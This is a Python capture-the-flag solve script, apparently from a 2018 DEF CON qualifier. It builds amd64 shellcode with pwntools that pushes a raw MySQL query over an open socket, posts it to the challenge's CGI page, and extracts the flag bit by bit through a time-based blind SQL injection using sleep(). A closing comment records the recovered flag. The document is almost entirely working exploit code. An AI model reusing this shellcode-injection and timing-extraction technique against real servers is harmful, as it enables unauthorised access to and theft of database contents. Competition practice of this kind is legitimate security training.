from pwn import *
from collections import defaultdict
import requests
context.clear(arch='amd64')

off = 1
soff = 1

def get_time(soff, off):
    query = "select IF(substr(LPAD(bin(ascii(substr((select group_concat(flag) from flag), {off}, 1))), 8, 0), {soff}, 1) = 0x30, sleep(3), 2)".format(off=off, soff=soff)
    encode = p32(len(query) + 1) + "\x03" + query
    fd = 4
    shellcode = shellcraft.amd64.linux.echo(encode, fd) + shellcraft.amd64.linux.read(fd, count=4)
    shellcode = asm(shellcode)
    data = {'shell':shellcode}
    begin = time.time()
    r = requests.post('http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php', data)
    elapsed = time.time() - begin
    r.close()
    return elapsed

ans = ""
c = ""
for off in xrange(len(ans) + 1, 100):
    found = defaultdict(int)
    gonext = False
    print("FINDING %dth char" % off)
    while True:
        for soff in xrange(1, 8 + 1):
            elapsed = 0
            for i in xrange(3):
                elapsed += get_time(soff, off)
            if elapsed > 8:
                c += "0"
            else:
                c += "1"

            print(elapsed, c)
            if len(c) == 8:
                candidate = chr(int(c, 2))
                found[candidate] += 1
                print("candidate: %c" % candidate)
                if found[candidate] == 1:
                    ans += candidate
                    print("ANS:%s" % ans)
                    gonext=True
                c = ""

        if gonext:
            break


# flag: "OOO{she||code and webshell is old news, get with the times my friend!}"
